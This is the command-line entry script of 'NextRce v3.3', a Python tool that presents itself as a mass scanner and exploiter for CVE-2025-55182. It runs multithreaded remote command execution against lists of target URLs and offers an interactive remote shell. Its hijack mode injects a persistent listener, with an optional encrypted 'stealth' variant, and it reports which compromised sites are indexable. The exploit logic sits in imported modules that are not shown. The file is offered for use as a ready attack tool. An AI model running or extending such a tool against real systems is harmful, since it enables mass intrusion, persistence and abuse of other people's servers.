#!/usr/bin/env python3
"""
NextRce v3.3 - CVE-2025-55182 Mass Scanner & Exploiter
Core scan/exploit uses stdlib; openpyxl and cryptography are optional extras.
"""
import argparse
import os
import sys
from concurrent.futures import ThreadPoolExecutor

from nextrce_config import MAX_THREADS, Colors
from nextrce_exploit import NextExploiter
from nextrce_http import extract_url
from nextrce_report import (
    export_stack_files_from_csv,
    find_default_target_list,
    load_report_from_csv,
    load_target_file,
    print_banner,
    project_root,
)

try:
    from openpyxl import Workbook  # noqa: F401 — checked via nextrce_report._HAS_OPENPYXL
    from nextrce_report import _HAS_OPENPYXL
except ImportError:
    from nextrce_report import _HAS_OPENPYXL

def main():
    print_banner()
    parser = argparse.ArgumentParser(description="NextRce - Mass Scanner & Exploiter (no-deps)")
    parser.add_argument("-l", "--list",    help="File containing list of URLs")
    parser.add_argument("-u", "--url",     help="Single target URL")
    parser.add_argument("-c", "--cmd",     default="id", help="Command to execute (default: id)")
    parser.add_argument("-t", "--threads", type=int, default=30,
                        help=f"Number of threads (default: 30, max: {MAX_THREADS})")
    parser.add_argument("-p", "--proxy",   help="HTTP Proxy (e.g., http://127.0.0.1:8080)")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Show failed attempts, errors and non-vulnerable targets")
    parser.add_argument("-o", "--output",      help="Save results to file (e.g., results.txt)")
    parser.add_argument("-i", "--interactive", action="store_true",
                        help="Interactive shell mode for single target (requires -u)")
    parser.add_argument("-H", "--hijack",      action="store_true",
                        help="HTTP Hijack shell mode - inject persistent listener (requires -u)")
    parser.add_argument("--stealth",           action="store_true",
                        help="Enable AES-256-CBC encryption for hijack mode (requires cryptography)")
    parser.add_argument("--export-stacks",     action="store_true",
                        help="Regenerate stack txt files from results/report.csv (no scan)")
    parser.add_argument("--check-indexable",   action="store_true",
                        help="Check SEO indexability for success targets in report.csv")

    args = parser.parse_args()

    if args.export_stacks:
        csv_path = os.path.join(project_root(), 'results', 'report.csv')
        if not os.path.isfile(csv_path):
            print(f"{Colors.RED}[!] Report not found: {csv_path}{Colors.RESET}")
            sys.exit(1)
        written = export_stack_files_from_csv(csv_path)
        if written:
            print(f"{Colors.GREEN}[*] Stack files: {', '.join(written)}{Colors.RESET}")
        else:
            print(f"{Colors.YELLOW}[!] No stack matches in {csv_path}{Colors.RESET}")
        sys.exit(0)

    if args.check_indexable:
        csv_path = os.path.join(project_root(), 'results', 'report.csv')
        if not os.path.isfile(csv_path):
            print(f"{Colors.RED}[!] Report not found: {csv_path}{Colors.RESET}")
            sys.exit(1)
        targets, report_rows = load_report_from_csv(csv_path)
        success_urls = [u for u in targets if report_rows[u].get('status') == 'success']
        scanner = NextExploiter(report_file=csv_path)
        scanner.report_rows = report_rows
        scanner.check_indexable_targets(success_urls, max_workers=20)
        _, stack_written = scanner.write_report(targets)
        if stack_written:
            print(f"{Colors.GREEN}[*] Stack files: {', '.join(stack_written)}{Colors.RESET}")
        print(f"{Colors.GREEN}[*] Report updated: {csv_path}{Colors.RESET}")
        sys.exit(0)

    if args.threads > MAX_THREADS:
        print(f"{Colors.YELLOW}[!] Thread count capped at {MAX_THREADS} (requested: {args.threads}){Colors.RESET}")
        args.threads = MAX_THREADS

    # HTTP 劫持模式
    if args.hijack:
        if not args.url:
            print(f"{Colors.RED}[!] Hijack 模式需要指定单个目标：-u <url>{Colors.RESET}")
            sys.exit(1)
        scanner = NextExploiter(
            cmd="id", timeout=15, proxy=args.proxy,
            verbose=args.verbose, output_file=args.output
        )
        scanner.hijack_shell(args.url, stealth=args.stealth)
        sys.exit(0)

    # 交互模式：直接进入 shell，不走扫描流程
    if args.interactive:
        if not args.url:
            print(f"{Colors.RED}[!] 交互模式需要指定单个目标：-u <url>{Colors.RESET}")
            sys.exit(1)
        scanner = NextExploiter(
            cmd="id", timeout=15, proxy=args.proxy,
            verbose=args.verbose, output_file=args.output
        )
        scanner.interactive_shell(args.url)
        sys.exit(0)

    targets = []
    list_file = None

    if args.url:
        targets.append(args.url)
    elif args.list:
        list_file = args.list
    elif not sys.stdin.isatty():
        print(f"{Colors.CYAN}[*] Reading targets from pipeline (stdin)...{Colors.RESET}")
        for line in sys.stdin:
            url = extract_url(line)
            if url:
                targets.append(url)
    else:
        list_file = find_default_target_list()
        if list_file:
            print(f"{Colors.CYAN}[*] Pipeline: using {list_file}{Colors.RESET}")
        else:
            print(f"{Colors.YELLOW}[!] Usage: python3 tools/nextrce.py"
                  f"  |  python3 tools/nextrce.py -l urls/target.txt"
                  f"  |  python3 tools/nextrce.py -u <url>{Colors.RESET}")
            sys.exit(1)

    if list_file:
        try:
            targets = load_target_file(list_file)
        except FileNotFoundError:
            print(f"{Colors.RED}[!] Error: File not found: {list_file}{Colors.RESET}")
            sys.exit(1)

    if not targets:
        print(f"{Colors.RED}[!] No targets to scan.{Colors.RESET}")
        sys.exit(1)

    # Batch scans: auto-save success/failed lists + full CSV report
    if not args.output and list_file:
        args.output = os.path.join(project_root(), 'results', 'success.txt')
    report_file = None if args.url else os.path.join(project_root(), 'results', 'report.csv')
    failed_file = None if args.url else os.path.join(project_root(), 'results', 'failed.txt')

    results_dir = os.path.join(project_root(), 'results')
    os.makedirs(results_dir, exist_ok=True)
    if args.output:
        open(args.output, 'w').close()
    if failed_file:
        open(failed_file, 'w').close()

    print(f"{Colors.BLUE}[*] Loaded {len(targets)} targets. Starting scan with {args.threads} threads...{Colors.RESET}")
    print(f"{Colors.GREY}[*] Payload Command: {args.cmd}{Colors.RESET}")
    if args.output:
        print(f"{Colors.GREY}[*] Success file: {args.output}{Colors.RESET}")
    if failed_file:
        print(f"{Colors.GREY}[*] Failed file: {failed_file}{Colors.RESET}")
    if report_file:
        print(f"{Colors.GREY}[*] Report file: {report_file}{Colors.RESET}")
    print()

    scanner = NextExploiter(
        cmd=args.cmd, timeout=8, proxy=args.proxy,
        verbose=args.verbose, output_file=args.output,
        failed_file=failed_file, report_file=report_file,
    )

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        executor.map(scanner.scan_and_exploit, targets)

    if report_file:
        success_urls = [
            u for u in targets
            if scanner.report_rows.get(u, {}).get('status') == 'success'
        ]
        if success_urls:
            try:
                enrich_workers = min(args.threads, 10, len(success_urls))
                scanner.enrich_successful_targets(success_urls, max_workers=enrich_workers)
                scanner.check_indexable_targets(success_urls, max_workers=min(args.threads, 10))
            except Exception as e:
                print(f"{Colors.YELLOW}[!] Enrichment/index check error (report still saved): {e}{Colors.RESET}")
        xlsx_path, stack_written = scanner.write_report(targets)
    else:
        xlsx_path = None
        stack_written = []

    print(f"\n{Colors.BLUE}[*] Scan completed.{Colors.RESET}")
    if args.output:
        print(f"{Colors.GREEN}[*] Success saved to: {args.output}{Colors.RESET}")
    if failed_file:
        print(f"{Colors.GREEN}[*] Failed saved to: {failed_file}{Colors.RESET}")
    if report_file:
        print(f"{Colors.GREEN}[*] Report saved to: {report_file}{Colors.RESET}")
        if xlsx_path:
            print(f"{Colors.GREEN}[*] Excel report saved to: {xlsx_path}{Colors.RESET}")
        elif not _HAS_OPENPYXL:
            print(f"{Colors.YELLOW}[!] Excel export skipped. Install: pip install openpyxl{Colors.RESET}")
        if stack_written:
            print(f"{Colors.GREEN}[*] Stack files: {', '.join(stack_written)}{Colors.RESET}")


if __name__ == "__main__":
    main()
